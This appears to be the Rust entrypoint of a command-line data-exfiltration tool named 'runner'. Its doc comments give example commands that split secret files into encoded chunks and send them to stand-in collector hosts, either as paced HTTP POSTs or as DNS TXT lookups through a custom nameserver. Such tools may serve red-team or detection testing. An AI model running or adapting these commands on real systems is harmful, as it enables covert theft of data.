//! Runner binary entrypoint.
//!
//! Parses CLI arguments and dispatches to command handlers in the `runner` crate.
//! The binary is intentionally a thin wrapper: argument parsing and dispatch
//! happen here, while the real work (file reading, encoding, and network I/O)
//! is performed by the command implementations found in `runner::commands`.
//!
//! Examples
//!
//! Basic HTTP exfiltration of two files (split into 10 chunks, 500ms delay):
//!
//! $ runner exfil http --src-files secret.txt,notes.txt -u http://collector.example.com/ingest \
//!     --chunks 10 --delay 500
//!
//! The command above will:
//! 1. Read `secret.txt` and `notes.txt`.
//! 2. Split each file into 10 roughly-equal parts.
//! 3. Base64+hex encode each chunk and POST it to the provided URL with
//!    Content-Type: text/plain, sleeping 500ms between requests.
//!
//! DNS-based exfiltration using a custom nameserver (UDP):
//!
//! $ runner exfil dns -f secret.txt -d exfil.example.com -p udp -n 1.2.3.4:53 --delay 250
//!
//! This will:
//! 1. Read `secret.txt` and compute DNS-safe chunks for the `exfil.example.com` domain.
//! 2. Configure the resolver to use the upstream nameserver `1.2.3.4:53` over UDP.
//! 3. Issue TXT-style lookups for each encoded chunk as `<chunk>.<destination>.`
//!    sleeping 250ms between queries.
//!
//! Notes
//! - The CLI is implemented with `clap` and dispatches to types implementing
//!   the `CommandHandler` trait. Those implementations may use blocking network
//!   calls or create a temporary async runtime as needed.
//! - Error handling in the example implementation is minimal (many places use
//!   `unwrap()`), so consider wrapping calls or enhancing error reporting for
//!   production usage.
//!
//! See `runner::commands::base::Cli` and `runner::commands::exfiltrate` for more
//! configuration options and available subcommands.

use clap::Parser;

fn main() -> runner::error::Result<()> {
    // Parse command-line arguments and execute the selected operation.
    runner::commands::base::Cli::parse().handle()
}
